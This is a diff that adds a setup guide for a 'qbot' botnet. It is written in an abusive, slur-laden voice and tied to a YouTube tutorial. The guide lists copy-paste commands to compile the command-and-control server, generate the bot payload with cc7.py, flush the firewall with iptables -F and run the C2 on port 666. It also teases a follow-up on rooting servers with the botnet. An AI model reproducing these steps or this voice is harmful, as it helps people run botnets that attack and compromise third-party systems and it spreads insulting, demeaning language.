@@ -1,0 +1,48 @@
+###############################################################################          ONLY FOR CENTOS 7          ###############################################################################
+
+
+
+This is a fucking qbot source so its very ez to setup do not mess up retards.
+
+Firstly Login to your vps via ssh on the MobaXterm client, you can download it from here(https://mobaxterm.mobatek.net/download.html)
+
+// After you login to your server you need to setup the source code of the qbot. drug and drop all the files you saw from the youtube decription and then do :
+1. sudo su // To go root its a must dummy
+2. Qbot setup :
+
+## Change the ip and put your server's one ##
+
+
+##-Copy paste-## :  yum update -y
+
+
+##-Copy paste-## : yum install python python-paramiko gcc nano nc screen psmisc bzip2 wget -y
+
+
+##-Copy paste-## : gcc server.c -o cnc -pthread
+
+
+##-Copy paste & put user+pass example zex 2212-# : nano orbit.txt
+
+
+##-Copy paste-## : python cc7.py client.c your server ip you dumbass //save your fucking payload you will need it
+
+
+##-Copy paste-## : iptables -F
+
+
+##-Copy paste-## : screen ./cnc 42516 1 666
+
+3. Putty Login :
+
+##-The bot port is 666-##
+##-Connection type is raw-##
+
+
+// wow! if you need any help cuz you may be too stupid to understand dm on discord z3x#7259 retard.
+
+SPOIL : the next video i am going to show you how to root servers on your fucking botnet!
+make sure you subcribe : https://www.youtube.com/channel/UCx2uFTprdPjfYBf6S5PZC5A
+
+
+
